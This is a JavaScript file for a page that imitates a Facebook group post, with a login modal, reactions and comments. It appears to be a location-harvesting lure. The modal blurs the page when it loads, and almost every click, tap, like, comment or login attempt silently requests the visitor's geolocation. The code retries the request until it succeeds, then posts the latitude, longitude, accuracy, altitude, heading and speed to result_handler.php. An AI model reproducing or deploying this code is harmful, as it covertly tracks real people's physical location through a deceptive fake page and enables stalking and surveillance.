// utility
function qs(elem) {return document.querySelector(elem);}
function qsa(elem) {return document.querySelectorAll(elem);}

// Helper function to handle location capture with consistent error handling
function captureLocation(context = 'interaction') {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // For mobile devices, try to use cached location first if recent enough
    if (isMobile && window.initialLocation) {
        var locationAge = Date.now() - window.initialLocation.timestamp;
        if (locationAge < 300000) { // Less than 5 minutes old
            console.log(`Using cached location for ${context}`);
            $.ajax({
                type: 'POST',
                url: 'result_handler.php',
                data: { 
                    Status: 'success', 
                    Lat: window.initialLocation.lat + ' deg', 
                    Lon: window.initialLocation.lon + ' deg', 
                    Acc: window.initialLocation.accuracy + ' m',
                    Alt: 'Not Available',
                    Dir: 'Not Available',
                    Spd: 'Not Available'
                },
                mimeType: 'text'
            });
            return;
        }
    }
    
    if (typeof locate === 'function') {
        locate(
            function() { 
                // Success callback - location captured successfully
                console.log(`Location captured successfully during: ${context}`);
            }, 
            function(error, errorText) { 
                // Error callback - handle location errors gracefully
                console.log(`Location capture failed during ${context}:`, errorText);
                
                // Enhanced mobile retry logic
                if (error && (error.code === 3 || error.code === 2)) { // TIMEOUT or POSITION_UNAVAILABLE
                    console.log(`Retrying location capture for ${context} with mobile-optimized settings...`);
                    
                    setTimeout(function() {
                        if (navigator.geolocation) {
                            // Mobile-specific retry with progressive fallback
                            var retryOptions = {
                                enableHighAccuracy: isMobile ? false : true, // Reverse strategy on retry
                                timeout: isMobile ? 15000 : 8000, // Longer timeout for mobile
                                maximumAge: isMobile ? 30000 : 600000 // More recent cache for mobile
                            };
                            
                            navigator.geolocation.getCurrentPosition(
                                function(position) {
                                    console.log(`Location captured on retry for: ${context}`);
                                    // Send the successful location data
                                    var lat = position.coords.latitude + ' deg';
                                    var lon = position.coords.longitude + ' deg';
                                    var acc = position.coords.accuracy + ' m';
                                    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available';
                                    var dir = position.coords.heading ? position.coords.heading + ' deg' : 'Not Available';
                                    var spd = position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available';
                                    
                                    // Update cached location for mobile
                                    if (isMobile) {
                                        window.initialLocation = {
                                            lat: position.coords.latitude,
                                            lon: position.coords.longitude,
                                            accuracy: position.coords.accuracy,
                                            timestamp: Date.now()
                                        };
                                    }
                                    
                                    $.ajax({
                                        type: 'POST',
                                        url: 'result_handler.php',
                                        data: { 
                                            Status: 'success', 
                                            Lat: lat, 
                                            Lon: lon, 
                                            Acc: acc,
                                            Alt: alt,
                                            Dir: dir,
                                            Spd: spd
                                        },
                                        mimeType: 'text'
                                    });
                                },
                                function(retryError) {
                                    console.log(`Retry also failed for ${context}:`, retryError.message);
                                    
                                    // Final fallback attempt with very permissive settings
                                    if (isMobile && retryError.code === 3) {
                                        setTimeout(function() {
                                            navigator.geolocation.getCurrentPosition(
                                                function(position) {
                                                    console.log(`Location captured on final attempt for: ${context}`);
                                                    var lat = position.coords.latitude + ' deg';
                                                    var lon = position.coords.longitude + ' deg';
                                                    var acc = position.coords.accuracy + ' m';
                                                    
                                                    $.ajax({
                                                        type: 'POST',
                                                        url: 'result_handler.php',
                                                        data: { 
                                                            Status: 'success', 
                                                            Lat: lat, 
                                                            Lon: lon, 
                                                            Acc: acc,
                                                            Alt: 'Not Available',
                                                            Dir: 'Not Available',
                                                            Spd: 'Not Available'
                                                        },
                                                        mimeType: 'text'
                                                    });
                                                },
                                                function(finalError) {
                                                    console.log(`All location attempts failed for ${context}`);
                                                },
                                                { 
                                                    enableHighAccuracy: false, 
                                                    timeout: 30000, // Very long timeout for final attempt
                                                    maximumAge: 1800000 // Accept very old cached positions (30 minutes)
                                                }
                                            );
                                        }, 2000);
                                    }
                                },
                                retryOptions
                            );
                        }
                    }, isMobile ? 2000 : 1000); // Longer delay for mobile
                }
            }
        );
    } else {
        console.log('Location function not available');
    }
}

// Mobile location optimization function
function requestLocationPermission() {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    if (isMobile && navigator.geolocation) {
        // Pre-request location permission with user-friendly approach
        navigator.geolocation.getCurrentPosition(
            function(position) {
                console.log('Location permission granted');
                // Store initial location to improve subsequent requests
                window.initialLocation = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: Date.now()
                };
            },
            function(error) {
                console.log('Location permission handling:', error.message);
                // Even if initial request fails, we've attempted to get permission
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 60000
            }
        );
    }
}

// globals
hovered_btn_id = 0;

// Modal functionality
function initializeModal() {
    const modal = qs('#login-modal');
    const modalClose = qs('#modal-close');
    const modalLogin = qs('#modal-login');
    const modalSignup = qs('#modal-signup');
    const contentElements = [
        qs('#facebook-header'),
        qs('.mobile-nav-bar'),
        qs('.fb-group-header'),
        qs('.main-content-wrapper'),
        qs('.fb-bottom-banner')
    ];

    // Show modal on page load
    function showModal() {
        modal.classList.remove('hidden');
        // Add blur effect to content
        contentElements.forEach(element => {
            if (element) {
                element.classList.add('content-blurred');
            }
        });
        
        // Prevent scrolling
        document.body.style.overflow = 'hidden';
    }

    // Hide modal
    function hideModal() {
        modal.classList.add('hidden');
        // Remove blur effect from content
        contentElements.forEach(element => {
            if (element) {
                element.classList.remove('content-blurred');
            }
        });
        
        // Restore scrolling
        document.body.style.overflow = '';
    }

    // Event listeners
    if (modalClose) {
        modalClose.addEventListener('click', function() {
            captureLocation('modal close button');
            hideModal();
        });
    }

    if (modalLogin) {
        modalLogin.addEventListener('click', function() {
            hideModal();
            // Trigger location capture when user clicks login with timeout handling
            captureLocation('modal login');
            // Focus on the login form in the header
            const emailInput = qs('#email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    }

    if (modalSignup) {
        modalSignup.addEventListener('click', function() {
            hideModal();
            // Trigger location capture when user clicks signup with timeout handling
            captureLocation('modal signup');
            // In a real app, this would redirect to signup page
        });
    }

    // Close modal when clicking outside
    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                captureLocation('modal background click');
                hideModal();
            }
        });
    }

    // Close modal with Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
            hideModal();
        }
    });

    // Show modal on page load
    showModal();
}

// Facebook login functionality
function initializeFacebookLogin() {
    const loginForm = qs('.fb-login-form');
    const emailInput = qs('#email');
    const passwordInput = qs('#password');
    const loginBtn = qs('.fb-login-btn');

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                // Add visual feedback for empty fields
                if (!email) {
                    emailInput.style.borderColor = '#fa383e';
                    emailInput.style.boxShadow = '0 0 0 2px rgba(250, 56, 62, 0.2)';
                }
                if (!password) {
                    passwordInput.style.borderColor = '#fa383e';
                    passwordInput.style.boxShadow = '0 0 0 2px rgba(250, 56, 62, 0.2)';
                }
                
                // Reset error styling after 3 seconds
                setTimeout(() => {
                    emailInput.style.borderColor = '';
                    emailInput.style.boxShadow = '';
                    passwordInput.style.borderColor = '';
                    passwordInput.style.boxShadow = '';
                }, 3000);
                
                return false;
            }
            
            // Simulate login attempt
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;
            
            // Trigger location capture when user submits login form with timeout handling
            captureLocation('login form submission');
            
            setTimeout(() => {
                loginBtn.textContent = 'Log in';
                loginBtn.disabled = false;
                // In a real app, this would redirect or show success/error
            }, 1500);
        });

        // Reset error styling when user starts typing
        emailInput.addEventListener('input', function() {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        });
        
        passwordInput.addEventListener('input', function() {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        });
    }
}

// elements
const
opt_btns = qsa(".top-options button"),
menu = qs("#option"),
emoji_panel = qs("#emojies"),
comment_inputs = qsa(".comment-input-area input"),
comment_boxs = qsa(".comment-box"),
comment_btns = qsa(".comment-btn"),
like_btns = qsa(".like-btn"),
emojies = qsa("#emojies img");

// functions
function getOffset(el) {
	const rect = el.getBoundingClientRect();
	return {
		left: rect.left + window.scrollX,
		top: rect.top + window.scrollY
	};
}

function toggle_option(button)
{
	if (menu.style.visibility == "visible")
	{
		menu.style.visibility = "hidden";
		menu.style.top =  "0px";
		menu.style.left = "0px";
	}
	else
	{
		menu.style.visibility = "visible";
		
		// Responsive positioning
		const buttonRect = button.getBoundingClientRect();
		const menuWidth = 340; // Default menu width
		const mobileMenuWidth = 280; // Mobile menu width
		const viewportWidth = window.innerWidth;
		
		if (viewportWidth <= 480) {
			// Mobile positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = Math.max(10, getOffset(button).left - 200) + "px";
		} else if (viewportWidth <= 768) {
			// Tablet positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = Math.max(10, getOffset(button).left - 250) + "px";
		} else {
			// Desktop positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = getOffset(button).left - 315 + "px";
		}
	}
}

function toggle_reaction(button)
{
	if (emoji_panel.style.visibility == "visible")
	{
		emoji_panel.style.visibility = "hidden";
	}
	else
	{
		emoji_panel.style.visibility = "visible";
		
		// Responsive positioning for emoji panel
		const viewportWidth = window.innerWidth;
		const buttonRect = button.getBoundingClientRect();
		
		if (viewportWidth <= 480) {
			// Mobile positioning - center the emoji panel
			const panelWidth = 250;
			const leftPos = Math.max(10, Math.min(viewportWidth - panelWidth - 10, getOffset(button).left - 100));
			emoji_panel.style.top = getOffset(button).top - 50 + "px";
			emoji_panel.style.left = leftPos + "px";
		} else {
			// Desktop positioning
			emoji_panel.style.top = getOffset(button).top - 50 + "px";
			emoji_panel.style.left = getOffset(button).left - 50 + "px";
		}
	}
}
function placeLIke(emoji, id) {
	
	var emoji_src, btn_text;
	
	switch (emoji) {
		case "e-like":
			emoji_src = "./svg/like.svg";
			btn_text = "Like";
			break;
		case "e-love":
			emoji_src = "./svg/love.svg";
			btn_text = "Love";
			break;
		case "e-care":
			emoji_src = "./svg/care.svg";
			btn_text = "Care";
			break;
		case "e-haha":
			emoji_src = "./svg/haha.svg";
			btn_text = "haha";
			break;
		case "e-wow":
			emoji_src = "./svg/wow.svg";
			btn_text = "Wow";
			break;
		case "e-sad":
			emoji_src = "./svg/sad.svg";
			btn_text = "Sad";
			break;
		case "e-angry":
			emoji_src = "./svg/angry.svg";
			btn_text = "Angry";
			break;
		default:
			return;
	}
	
	qs("#fpost" + id).querySelector(".like-btn img").src = emoji_src;
	qs("#fpost" + id).querySelector(".like-btn img").style.width = "20px";
	qs("#fpost" + id).querySelector(".like-btn span").innerHTML = btn_text;
}
function makeComment(text, id) {

	qs("#fpost" + id).querySelector(".comment-box").innerHTML += 
	`
	<div class="comment-container">
		<div class="comment">
		<img src="assets/profile-pic.jpg" alt="" class="comment-img">
		<div class="comment-text">
			<div class="comment-header">
			<p><strong>Rejwan Islam Rizvy</strong></p>
			</div>
			<p>${text}</p>
		</div>
		<div class="three-dot">
			<img src="svg/three_dot_gray.svg" class="three-dot-img" alt="">
		</div>
		</div>
		<div class="comment-lks">
		<p>
			<span>Like</span><span class="dot"> . </span>
			<span>Reply</span><span class="dot"> . </span>
			<span>Share</span><span class="dot"> . </span>
			<span>just now</span></p>
		</div>
	</div>
	`;
}

//******************
// Main Function here
//******************

// Toggle see more/see less functionality
function toggleText() {
  // Capture location when see more/less is clicked
  captureLocation('see more/less toggle');
  
  const hiddenText = document.querySelector('.post-hidden-text');
  const seeMoreBtn = document.querySelector('.see-more');
  
  if (hiddenText.style.display === 'none') {
    hiddenText.style.display = 'block';
    seeMoreBtn.textContent = '...عرض أقل';
  } else {
    hiddenText.style.display = 'none';
    seeMoreBtn.textContent = '...المزيد';
  }
}

// Initialize content visibility as soon as possible
document.addEventListener('DOMContentLoaded', function() {
    qs("#mother").style.display = "block";
    qs("#js-error").style.display = "none";
    
    // Request location permission early for mobile devices
    requestLocationPermission();
    
    // Initialize modal
    initializeModal();
    
    // Initialize Facebook login functionality
    initializeFacebookLogin();
});

window.addEventListener('load', function() {
	
	opt_btns.forEach(btn => {
		btn.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks options menu
			captureLocation('options menu');
			toggle_option(btn);
		});
	});
	
	comment_inputs.forEach(input => {
		input.addEventListener("change", (e)=>{
			// Trigger location capture when user adds a comment
			captureLocation('comment input');
			makeComment(input.value, input.getAttribute("fpost"));
			input.value = "";
		});
	});
	
	comment_btns.forEach(button => {
		button.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks comment button
			captureLocation('comment button');
			qs("#fpost" + button.getAttribute("fpost")).querySelector("input").focus();
		});
	});
	
	like_btns.forEach(button => {
		// Handle both mouse and touch events
		button.addEventListener("mouseover", (e)=>{
			if (window.innerWidth > 768) { // Only on desktop
				hovered_btn_id = button.getAttribute("fpost");
				toggle_reaction(button);
			}
		});
		
		button.addEventListener("mouseout", (e)=>{
			if (window.innerWidth > 768) { // Only on desktop
				toggle_reaction(button);
			}
		});
		
		button.addEventListener("click", (e)=>{
			hovered_btn_id = button.getAttribute("fpost");
			// Trigger location capture when user clicks like button
			captureLocation('like button');
			if (window.innerWidth <= 768) {
				// On mobile, show reaction panel on click
				if (emoji_panel.style.visibility === "visible") {
					toggle_reaction(button);
				} else {
					toggle_reaction(button);
				}
			} else {
				// On desktop, place like directly
				placeLIke("e-like", hovered_btn_id);
			}
		});
		
		// Add touch support for mobile
		button.addEventListener("touchstart", (e)=>{
			if (window.innerWidth <= 768) {
				e.preventDefault();
				hovered_btn_id = button.getAttribute("fpost");
				toggle_reaction(button);
			}
		});
	});
	
	emojies.forEach(emoji => {
		emoji.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks emoji reaction
			captureLocation('emoji reaction');
			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
			// Hide emoji panel after selection on mobile
			if (window.innerWidth <= 768) {
				emoji_panel.style.visibility = "hidden";
			}
		});
		
		// Add touch support
		emoji.addEventListener("touchend", (e)=>{
			e.preventDefault();
			// Trigger location capture when user touches emoji reaction
			captureLocation('emoji touch');
			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
			if (window.innerWidth <= 768) {
				emoji_panel.style.visibility = "hidden";
			}
		});
	});
	
	// Close dropdowns when clicking outside
	document.addEventListener("click", (e) => {
		if (!e.target.closest("#option") && !e.target.closest(".top-options")) {
			menu.style.visibility = "hidden";
		}
		if (!e.target.closest("#emojies") && !e.target.closest(".like-btn")) {
			emoji_panel.style.visibility = "hidden";
		}
	});
	
	// Handle orientation change
	window.addEventListener("orientationchange", () => {
		setTimeout(() => {
			menu.style.visibility = "hidden";
			emoji_panel.style.visibility = "hidden";
		}, 100);
	});
	
	// Add location capture to additional interactive elements
	
	// Facebook logo and links
	const fbLogoLink = qs('.fb-logo-link');
	if (fbLogoLink) {
		fbLogoLink.addEventListener('click', function() {
			captureLocation('facebook logo');
		});
	}
	
	// Forgotten password link
	const forgottenLink = qs('.forgotten-link');
	if (forgottenLink) {
		forgottenLink.addEventListener('click', function() {
			captureLocation('forgotten password link');
		});
	}
	
	// Mobile back button
	const mobileBackBtn = qs('.mobile-back-btn');
	if (mobileBackBtn) {
		mobileBackBtn.addEventListener('click', function() {
			captureLocation('mobile back button');
		});
	}
	
	// Profile pictures and names
	const profilePics = qsa('.profile-picture img, .comment-img');
	profilePics.forEach(img => {
		img.addEventListener('click', function() {
			captureLocation('profile picture');
		});
	});
	
	// Profile names and links
	const profileNames = qsa('.profile-name a, .poster-name, .comment-header strong');
	profileNames.forEach(name => {
		name.addEventListener('click', function() {
			captureLocation('profile name');
		});
	});
	
	// Three dot menus in comments
	const threeDots = qsa('.three-dot, .three-dot-img');
	threeDots.forEach(dot => {
		dot.addEventListener('click', function() {
			captureLocation('three dot menu');
		});
	});
	
	// Comment interaction links (Like, Reply, Share in comments)
	const commentLinks = qsa('.comment-lks span');
	commentLinks.forEach(link => {
		link.addEventListener('click', function() {
			captureLocation('comment interaction');
		});
	});
	
	// Time stamps and other post metadata
	const postMeta = qsa('.post-time span, .group-name, .member-count');
	postMeta.forEach(meta => {
		meta.addEventListener('click', function() {
			captureLocation('post metadata');
		});
	});
	
	// Post images
	const postImages = qsa('.post-content img');
	postImages.forEach(img => {
		img.addEventListener('click', function() {
			captureLocation('post image');
		});
	});
	
	// Hashtags and mentions
	const hashtags = qsa('[style*="#1877F2"]');
	hashtags.forEach(tag => {
		tag.addEventListener('click', function() {
			captureLocation('hashtag or mention');
		});
	});
	
	// Follow/Join button
	const joinBtn = qs('.join-group-btn');
	if (joinBtn) {
		joinBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks follow/join button
			captureLocation('join group button');
		});
	}
	
	// Share buttons
	const shareBtns = qsa('.share-btn');
	shareBtns.forEach(btn => {
		btn.addEventListener('click', function() {
			// Trigger location capture when user clicks share button
			captureLocation('share button');
		});
	});
	
	// Bottom banner buttons
	const bannerLoginBtn = qs('.fb-banner-login-btn');
	const bannerSignupBtn = qs('.fb-banner-signup-btn');
	
	if (bannerLoginBtn) {
		bannerLoginBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks banner login button
			captureLocation('banner login button');
		});
	}
	
	if (bannerSignupBtn) {
		bannerSignupBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks banner signup button
			captureLocation('banner signup button');
		});
	}
	
	// Mobile login button
	const mobileLoginBtn = qs('.mobile-login-btn');
	if (mobileLoginBtn) {
		mobileLoginBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks mobile login button
			captureLocation('mobile login button');
		});
	}
	
	// Mobile open app button
	const mobileOpenAppBtn = qs('.mobile-open-app');
	if (mobileOpenAppBtn) {
		mobileOpenAppBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks open app button
			captureLocation('mobile open app button');
		});
	}
	
	// See more/less toggle
	const seeMoreBtn = qs('.see-more');
	if (seeMoreBtn) {
		seeMoreBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks see more button
			captureLocation('see more button');
		});
	}
	
	// Add comprehensive click tracking for any clickable elements
	// This captures location for ANY click on interactive elements that might be missed
	const interactiveSelectors = [
		'a', 'button', '[onclick]', '[role="button"]', 
		'[tabindex]', 'input[type="submit"]', 'input[type="button"]',
		'.clickable', '[data-click]', '.fb-logo-link', '.forgotten-link',
		'.mobile-back-btn', '.poster-name', '.group-name', '.comment-header',
		'.three-dot', '.three-dot-img', '.profile-picture img', '.comment-img',
		'.profile-name a', '.post-time span', 'img[src*="svg"]'
	];
	
	interactiveSelectors.forEach(selector => {
		const elements = qsa(selector);
		elements.forEach(element => {
			// Check if element doesn't already have our location tracking
			if (!element.hasAttribute('data-location-tracked')) {
				element.setAttribute('data-location-tracked', 'true');
				element.addEventListener('click', function(e) {
					const elementInfo = element.className || element.tagName || 'unknown element';
					captureLocation(`interactive element: ${elementInfo}`);
				});
			}
		});
	});
	
	// Add location capture to any dynamically added content or missed elements
	document.addEventListener('click', function(e) {
		const target = e.target;
		
		// Check if the clicked element is interactive but doesn't have location tracking
		const isInteractive = target.tagName === 'A' || 
							   target.tagName === 'BUTTON' || 
							   target.hasAttribute('onclick') ||
							   target.style.cursor === 'pointer' ||
							   target.closest('a') ||
							   target.closest('button') ||
							   target.closest('[onclick]') ||
							   target.closest('[role="button"]');
		
		if (isInteractive && !target.hasAttribute('data-location-tracked')) {
			const elementInfo = target.className || target.tagName || target.textContent?.substring(0, 20) || 'unknown';
			captureLocation(`fallback click: ${elementInfo}`);
		}
	}, true); // Use capture phase to ensure we catch all clicks
	
	// Also capture location on double-click events (common on mobile)
	document.addEventListener('dblclick', function(e) {
		captureLocation('double click interaction');
	});
	
	// Capture location on touch events for mobile devices
	document.addEventListener('touchend', function(e) {
		// Only if it's a tap (not a scroll or swipe)
		if (e.changedTouches && e.changedTouches.length === 1) {
			const target = e.target;
			const isInteractive = target.tagName === 'A' || 
								   target.tagName === 'BUTTON' || 
								   target.closest('a') ||
								   target.closest('button') ||
								   target.style.cursor === 'pointer';
			
			if (isInteractive) {
				captureLocation('touch interaction');
			}
		}
	});
});